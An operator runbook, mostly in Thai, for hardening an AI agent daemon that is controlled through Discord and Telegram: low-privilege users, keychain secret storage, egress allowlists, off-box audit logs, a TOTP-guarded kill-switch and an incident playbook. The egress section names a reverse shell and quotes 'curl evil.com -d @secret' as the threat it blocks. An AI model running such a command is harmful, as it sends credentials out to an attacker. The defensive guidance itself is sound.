# SETUP-HARDENING.md — Operator Runbook

> ขั้นตอน **deployment-level hardening** ที่ต้องทำ **ก่อนเปิด listener (Discord/Telegram) สู่ภายนอก**
> อ้างอิง: `ai-agent-system-design.md` §9.5 (OS isolation), §9.6 (audit/kill-switch), §10 (reliability), §9.8 (trust model)
>
> โค้ดในแอปทำ defense-in-depth ชั้นแอปแล้ว (argv allowlist, path scope, taint, secret broker, audit chain, privilege self-check)
> แต่ **กำแพง OS จริง bypass ไม่ได้ด้วยโค้ดในแอป** — ต้องตั้งค่าตามเอกสารนี้

---

## 0. Pre-listener checklist (gate ก่อนเปิดรับคำสั่งจากภายนอก)

- [ ] รัน `npx tsx src/test-security.ts` → ผ่านครบทุก test (§9.8 บังคับ)
- [ ] daemon รันใต้ **dedicated low-privilege user** (ดู §1) — ตั้ง `REQUIRE_LOWPRIV=true`
- [ ] secrets อยู่ใน OS keychain / DPAPI หรือไฟล์ `chmod 600` ไม่ใช่ `.env` plaintext (ดู §2)
- [ ] egress firewall เปิดเฉพาะ host ที่จำเป็น (ดู §3)
- [ ] audit log ถูก ship ออกนอกเครื่อง (append-only sink) (ดู §4)
- [ ] ทดสอบ kill-switch (`!panic` / `/panic`) และ incident playbook (ดู §5)
- [ ] เริ่มที่ **read-only mode** ก่อน แล้วค่อย ARM bash หลังทุกข้อข้างบนครบ (§9.8)

---

## 1. รัน daemon เป็น dedicated low-privilege user (§9.5 / T10)

**ห้ามรัน daemon ด้วย user หลัก/elevated** — RCE จะได้สิทธิ์เท่าคุณ (ssh keys, cookies, keychain)
แอปมี self-check (`src/core/hardening.ts`): ถ้า `REQUIRE_LOWPRIV=true` daemon จะ **ปฏิเสธ start** เมื่อรันแบบ elevated/root

### Windows
```powershell
# สร้าง local user สิทธิ์ต่ำ (ไม่อยู่ในกลุ่ม Administrators)
net user agentsvc <StrongPassword> /add
# จำกัดสิทธิ์โฟลเดอร์: ให้ agentsvc เข้าถึงเฉพาะ workspace + ~/.agent ของตัวเอง
# ตัดสิทธิ์อ่าน: C:\Users\<you>\.ssh, .aws, AppData (browser profiles), Credential Manager
icacls "C:\path\to\workspace" /grant agentsvc:(OI)(CI)M
```
- รัน daemon ด้วย user นี้ (Task Scheduler → "Run as agentsvc", "Run whether user is logged on")
- พิจารณา **Windows Sandbox / AppContainer** สำหรับ isolation ที่แข็งกว่า
- อย่าเปิด terminal แบบ "Run as administrator"

### Linux
```bash
sudo useradd -r -s /usr/sbin/nologin agentsvc
sudo -u agentsvc REQUIRE_LOWPRIV=true node dist/supervisor.js
# systemd: User=agentsvc, NoNewPrivileges=yes, ProtectHome=yes,
#          ReadWritePaths=/srv/agent/workspace /home/agentsvc/.agent
```

### Container (แนะนำสุด)
รัน fs/bash tools ใน Docker/Podman ที่ `--read-only`, `--cap-drop=ALL`, mount เฉพาะ workspace,
และ network ตาม §3

---

## 2. Secret storage (§9.2 / §9.5 / T4)

- **อย่าเก็บ key เป็น `.env` plaintext บนเครื่อง production**
- Windows: **DPAPI** (`ProtectedData`) หรือ Credential Manager
- macOS: **Keychain** · Linux: **secret-service / gnome-keyring**
- ไฟล์ที่เลี่ยงไม่ได้: `chmod 600`, เจ้าของ = agentsvc เท่านั้น
- แอปแยก secret ออกจาก `process.env` ตอน start (`initSecretBroker`) และ strip ออกจาก env ของ subprocess (`getSafeChildEnv`) แล้ว — แต่ที่มาของ key ต้องปลอดภัยตั้งแต่ต้น

---

## 3. Egress control (§9.5 / T8)

แอป **บังคับ network ไม่ได้** — ต้องทำที่ OS/firewall:
- default-deny outbound สำหรับ user/container ของ daemon
- allowlist เฉพาะ host ที่จำเป็น: `api.deepseek.com`, `generativelanguage.googleapis.com`,
  `api.telegram.org` / Discord gateway, Ollama (`localhost:11434`)
- กัน reverse shell / `curl evil.com -d @secret`

**Windows (ตัวอย่าง):**
```powershell
New-NetFirewallRule -DisplayName "agent-deny-out" -Direction Outbound `
  -Action Block -Profile Any -Owner (Get-LocalUser agentsvc).SID
# แล้วเพิ่ม allow rule เฉพาะปลายทางที่จำเป็น
```
**Linux:** iptables/nftables egress allowlist ต่อ uid ของ agentsvc

---

## 4. Audit log durability & off-box shipping (§9.6)

- audit log: `~/.agent/audit.log` — hash-chained, fsync แล้วในโค้ด
- **ship ออกนอกเครื่อง** ไป append-only sink (syslog/S3 object-lock/log service) ให้ attacker
  ที่ยึดเครื่องลบร่องรอยไม่ได้
- ตรวจ integrity เป็นระยะ: `!verify-audit` (Discord) / `/verify_audit` (Telegram)
  → เรียก `verifyAuditChain()` ตรวจ hash chain ทั้งเส้น (จับการแก้/ลบ/แทรก)

---

## 5. Kill-switch & incident playbook (§9.6)

**สั่งหยุดฉุกเฉิน:** `!panic` (Discord) / `/panic` (Telegram) → เขียน `~/.agent/kill-switch`
ทุก tool + agent loop เช็คไฟล์นี้และหยุดทันที; supervisor ก็จะฆ่า daemon

**ปลดล็อก:** `!unpanic <TOTP>` / `/unpanic <TOTP>` (ต้องใช้ TOTP out-of-band)

**Incident playbook (เมื่อสงสัยถูกยึด):**
1. `!panic` หยุดทุกอย่าง
2. revoke Discord/Telegram bot token
3. rotate provider API keys ทั้งหมด
4. หยุด daemon + supervisor
5. `verify-audit` + ตรวจ `~/.agent/audit.log` ที่ ship ไว้ หาช่วงเวลาที่ผิดปกติ
6. ตรวจ vault โน้ตที่แท็ก `untrusted` (memory poisoning §9.7)

---

## 6. Trust model — เริ่มจากต่ำสุดเสมอ (§9.8)

| โหมด | ความเสี่ยง | เมื่อไร |
|---|---|---|
| **Read-only** | ต่ำ | **เริ่มที่นี่** — ตอบ + อ่านไฟล์ ห้าม mutate |
| + out-of-band TOTP บน mutate | กลาง | หลังข้อ §1–§5 ครบ |
| Tailscale + local web | ต่ำ | ถ้ารับ VPN ได้ (ลด public surface) |

> Reality check (design §12): Phase 4 เขียนเร็ว แต่ **ปลอดภัยได้ก็ต่อเมื่อ §9.5 + out-of-band approval พร้อม**
> ถ้ายังไม่พร้อม → ใช้ read-only mode ไปก่อน
